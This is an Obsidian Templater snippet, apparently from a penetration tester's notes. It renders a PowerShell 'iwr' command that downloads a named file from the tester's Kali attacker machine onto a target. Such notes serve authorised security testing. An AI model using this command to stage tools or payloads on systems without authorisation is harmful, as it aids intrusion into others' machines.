<%*
let File = await tp.system.prompt("Enter the name of the File")
-%>

- Download the file <% File %>

>[!example]   [Powershell](Powershell.md) #powershell
>```shell
>iwr -uri http://<% tp.frontmatter["KaliIP"] %>:<% tp.frontmatter["ServersPort"] %>/<% File %> -Outfile <% File %>
>```



